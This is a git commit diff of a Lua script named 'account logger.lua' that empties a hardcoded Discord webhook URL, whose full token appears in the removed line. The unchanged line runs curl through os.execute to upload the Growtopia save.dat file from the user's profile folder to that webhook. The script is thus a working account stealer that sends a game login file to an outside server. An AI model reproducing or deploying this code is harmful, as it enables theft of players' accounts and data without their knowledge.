aea2a2ada6c33dfac44959b6858fb4fd7cff2ac5
Mandq <165655071+xMandq@users.noreply.github.com>
2024-04-15 05:06:13 +0400

    Update account logger.lua

--- account logger.lua
+++ account logger.lua
@@ -1,3 +1,3 @@
-webhook = "https://discord.com/api/webhooks/1213793605194616932/q5-HIpeOr6o4pHEaz-RQsxg4HfJTsMW3afHd4tTmUQDWdsIhiVzv6jrFEXHTfO70nHBW"
+webhook = ""
 
 status_code = os.execute('curl -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" -F "file=@' .. os.getenv("USERPROFILE") .. "/AppData/Local/Growtopia/save.dat" .. '" -F "content=" ' .. webhook)
